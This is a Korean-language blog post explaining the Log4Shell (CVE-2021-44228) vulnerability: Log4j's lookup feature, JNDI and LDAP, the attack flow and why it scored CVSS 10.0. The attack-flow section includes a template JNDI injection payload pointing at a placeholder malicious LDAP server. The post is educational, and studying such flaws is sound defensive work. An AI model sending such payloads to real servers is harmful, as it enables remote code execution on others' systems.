---
title: "Log4j(Log4Shell) 취약점 분석"
excerpt: "작년말을 뜨겁게 달구었던 Log4j(Log4jshell) 취약점에 대한 내용을 포스팅하려고 한다."
toc: true
toc_sticky: true
categories:
  - Security
tags:
  - Log4j
  - '2022'
  - Log4Shell
last_modified_at: 2022-05-21
---

![log4j_meme](/assets/images/2022/2022-05-21-17-24-35.png){: .align-center}

작년말을 뜨겁게 달구었던 Log4j(Log4jshell) 취약점에 대한 내용을 포스팅하려고 한다.
해당 취약점에 관하여서는 정말 많은 자료들이 포스팅되어 있고 지금 시점에 정보성으로 업데이트 하기 조금 늦었지만 그래도 직접 대응하였고 고생했던 것을 기록으로 남겨놓는 것이 의미가 있을 것 같아 남겨놓는다.

## “컴퓨터, 최악 취약점 발견”…국정원 “선제적 조치” / KBS 2021.12.11.

{% include video id="qaeLkwhHZTo" provider="youtube" %}

## Log4j?

말 그대로 Log for Java이다. Java 기반의 프로그램에서 사용하는 로깅 프레임워크로
크게 로그포맷팅/필터링/파일로 기록하는 기능으로 이루어져 있다.

|구성 모듈|주요 역할|기능|
|--------|-------|----|
|Logger|로깅 메시지를 Appender에 전달, 어느 레벨까지 Logging 을 수행할지 결정|로그 필터링|
|Appender|로그의 출력위치를 결정|로그 기록|
|Layout|로그가 어떤 형식으로 출력될 것인지 결졍|로그 포맷팅|

이러한 로깅 프레임워크가 어떻게 컴퓨터 역사상 최악의 취약점이 되었던 것일까?

## History

![jndi_lookup_plugin_support](/assets/images/2022/2022-05-22-13-23-54.png)

2017년 7월 13일 [Lookup 플러그인에 JNDI를 추가하는 이슈](https://issues.apache.org/jira/browse/LOG4J2-313){: target="_blank"}를 통해 Log4j_2.0-beta9에 최초로 취약점이 발생하게 되었다.
이후 2021년 11월 31일까지 알리바바의 클라우드 보안팀에 의해 해당 취약점이 발견되기 전까지 약 8년이라는 기간동안 해당 취약점은 방치되게 된다.

![alibaba_cloud_tweet](/assets/images/2022/2022-05-22-13-28-22.png)

### Log4j Lookups

그렇다면 Lookup 기능은 뭐고 JNDI란 무엇인가... 한번 차근차근 알아가 보자.
먼저 Lookup이란 기능은 로그에 시스템 속성의 값을 예약어를 이용해 출력할 수 있는 기능이다.

가령 아래와 같이 로그를 출력하게 된다면

```java
logger.info("This is test log for example of lookups - ${java:runtime}");
```

```
This is test log for example of lookups - Java(TM) SE Runtime Environment (build 11.0.13+10-LTS-370) from Oracle Corporation
```

이런 식으로 출력이 되는 것이다.
아마도 로그를 남길 때 특정 IP를 사용자 명으로 변경한다던지, 로그를 남기는 환경을 동적으로 기록한다던지 하는 목적으로 필요했던 것 같다.

### JNDI(Java Naming and Directory Interface)

Log4j Lookup 기능에 JNDI 기능을 지원하게 되었다는 게 이번 취약점의 핵심이다.
JNDI는 Jva 어플리케이션에서 이름을 통해 데이터와 리소스(Java 객체 형태)를 검색하고 조회 할 수 있도록 하는 디렉토리 서비스용 Java API 이다.

예를 들어 Java 어플리케이션은 JNDI API를 사용하여 DNS로 URL 주소를 넘겨주고 IP를 받아올 수 있게 하는 기능을 지원한다.

여기서 또 의문점이 생긴다.

**디렉토리 서비스**는 무엇일까?

알다시피 디렉토리는 데이터나 프린터, 컴퓨터, 사용자 정보 등 데이터가 저장된 용기라고 보면 된다.
디렉토리 서비스는 네트워크 서비스의 일종으로 이러한 디렉토리에 접근하여 관리하는 서비스를 말한다.

우리가 흔히 아는 **AD(Active Directory)**도이러한 디렉토리 서비스의 일환이다. (회사직원들의 계정 정보, PC에 대한 정보, 보안 정책들 등)
아래에 보이는 LDAP, DNS, NIS 등이 JNDI를 통해 지원되는 디렉토리 서비스의 일부이며, **서비스 프로바이더 인터페이스**라고도 불린다.

![jndi](/assets/images/2022/2022-05-22-19-27-18.png)

이번 Log4j 취약점은 이중 LDAP을 이용하여 원격 코드 실행(RCE) 취약점을 성공시켰다.

## Attack Flow

전반적인 공격의 경로는 아래와 같다.

![log4j_attack_flow](/assets/images/2022/2022-05-22-19-28-29.png)

1. 취약한 버전의 Log4j 를 사용하는 서버로 공격 패킷을 전송한다. 가령 아래와 같은 페이로드를 가진 패킷이다.
```
${jndi:ldap://MALICIOUS_LDAP_SERVER/COMMAND}
```

2. 취약한 버전의 Log4j 를 사용하는 서버는 아래 구문을 받고 JNDI Lookup 기능을 수행하기 위해 공격자의 악의적인 LDAP 서버(Malicious LDAP Server)로 접근하게 된다.

3. 공격자의 LDAP 서버는 악의적인 커맨드를 전송한다. (이것은 악성파일 배포사이트에서 악성코드를 다운받기 위한 명령어가 될 수도 있고, 해당 서버의 데이터를 삭제하거나 탈취하는 명령어가 될 수도 있다. 위의 시나리오에서는 공격자의 악의적인 HTTP 서버를 통해 공격하는 시나리오로 두었다.)

4. 공격자의 악의적인 HTTP 서버를 통해 공격을 성공하게된다. (악성파일 다운로드 등)

## Why CVSS 10.0?

해당 취약점은 **CVSS(Common Vulnerability Scoring System)** 에서 최고 위험등급인 10.0 을 받았다. ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228){: target="_blank"})

*CVSS : 공격 벡터, 공격의 복잡성, 필요한 권한 등 취약점의 중요 특성들에 따라 수치화 된 점수 심각성을 표기하는 서비스(1~10)

그렇다면 해당 취약점이 왜이렇게 위험한 것일까?
아래와 같은 이유로 그러한 이유가 설명이 될 것이다.

1. 자바 기반의 소프트웨어에서 광범위하게 사용되는 라이브러리
   해당 라이브러리는 Java 기반의 소프트웨어에서 로그를 남기는 프레임워크로 매우 광범위 하게 사용되고 있다. 이 말은 공격 대상/범위가 매우 광범위하다는 것이다.
2. 공격 방법이 매우 간단하다.
   복잡한 과정없이 취약한 서버를 대상으로 패킷을 전송하는 것으로만으로도 공격이 성공한다. 공격의 난이도가 매우 쉽다는 말이다.
3. 하나의 소프트웨어는 여러 라이브러리로 구성되어 있는데, 그 중 한곳이라도 취약하면 해당 소프트웨어가 취약하다.
   Log4j 는 앞서 말했던 로그를 남기는 프레임워크로 여러 오픈소스나 소프트웨어에서 광범위하게 사용되고 있다. 때문에 취약한 버전의 Log4j를 사용하면 해당 라이브러리를 사용하는 소프트웨어는 모두 취약하다는 의미가 된다.
4. 내 서버가 이미 공격을 당했는지 분석 위해서는 Log4j 사용 시점부터 분석이 필요하다.
   앞서 말했듯이 해당 취약점은 Log4j 2.0-beta9에 추가된 업데이트로부터 파생(약 8년 전)되었기 때문에 자신이 관리하는 서버가 공격을 받은지 분석을 하기 위해서는 최대 8년의 로그를 뒤져야 할 수도 있다.

## 실습

## Reference
- [Log4j 보안 문제와 해킹 과정 재현하기 (feat. CVE-2021-44228)](https://junhyunny.github.io/information/security/log4j-vulnerability-CVE-2021-44228/){: target="_blank"}
- [아파치 로그4j 취약점에 영향 받는 Log4j Core 공개](https://www.boannews.com/media/view.asp?idx=103419){: target="_blank"}
- [Apache Log4j 취약점 분석 및 대응방안](http://www.igloosec.co.kr/BLOG_Apache%20Log4j%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EB%B6%84%EC%84%9D%20%EB%B0%8F%20%EB%8C%80%EC%9D%91%EB%B0%A9%EC%95%88?searchItem=&searchWord=&bbsCateId=1&gotoPage=1){: target="_blank"}